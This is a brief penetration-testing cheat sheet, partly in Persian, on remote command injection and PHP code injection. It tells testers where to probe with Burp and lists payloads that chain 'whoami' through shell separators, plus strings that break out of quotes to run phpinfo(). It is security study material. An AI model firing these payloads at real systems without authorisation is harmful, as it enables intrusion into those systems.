# Remote Command Execution

## Concept
- در بخش های زیر به دنبال این آسیب پذیری می گردیم :
  - انتخاب یک آیتم از درون dropdown box
  - باید برای تغییر این پارامتر و نیز مشاهده تاثیر در پاسخ، حتما از Burp استفاده کنیم
- درون فیلدهای بخش ثبت نظرات که ممکن است از دستورات سیستمی برای پردازش اطلاعات کاربر (مانند ایمیل) استفاده شده باشد
  - هنگام استفاده از Burp باید حتما URL Encoding داشته باشیم (مثلا به جای فاصله از + استفاده کنیم)

## Payloads
```
;whoami
;%20whoami
&whoami
&&whoami
|whoami
||whoami
%0Awhoami
```

# Code Execution

## Payload
```
a";phpinfo();//
a".phpinfo();//
a);}phpinfo();//
```

## Sample PHP executable
- https://www.php.net/manual/en/function.shell-exec.php

